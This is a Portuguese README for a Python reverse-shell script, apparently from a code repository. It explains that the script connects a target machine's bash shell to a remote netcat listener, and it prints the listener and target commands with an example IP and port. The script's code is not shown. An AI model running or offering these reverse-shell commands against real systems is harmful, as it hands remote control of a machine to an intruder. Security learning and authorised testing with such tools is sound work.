# Reverse Shell TCP

Este projeto contém um script Python para criar uma reverse shell via TCP.
## Arquivo
- `reverse-shell.py`: Script principal que implementa a reverse shell.

## Como funciona
O script conecta-se a um servidor remoto (listener) especificado por IP e porta, redirecionando a entrada e saída padrão para o socket, e executa um shell Bash. Isso permite que o servidor remoto execute comandos no sistema onde o script está rodando.

## Uso
1. **No servidor listener:**
   Execute um listener na porta desejada, por exemplo usando netcat:
   ```bash
   nc -lvnp <porta>
   ```

2. **Na máquina alvo:**
   Execute o script Python:
   ```bash
   python3 reverse-shell.py <ip_do_servidor> <porta>
   ```
   - `<ip_do_servidor>`: IP do listener
   - `<porta>`: Porta usada pelo listener

## Exemplo
```bash
# No listener
nc -lvnp 4444

# Na alvo
python3 reverse-shell.py 192.168.0.100 4444
```

## Requisitos
- Python 3.x
- Sistema operacional com `/bin/bash` disponível

## Aviso Legal
> **Atenção:** Este script é para fins educacionais e de teste em ambientes controlados e autorizados. O uso não autorizado pode ser ilegal. O autor não se responsabiliza por qualquer uso indevido. 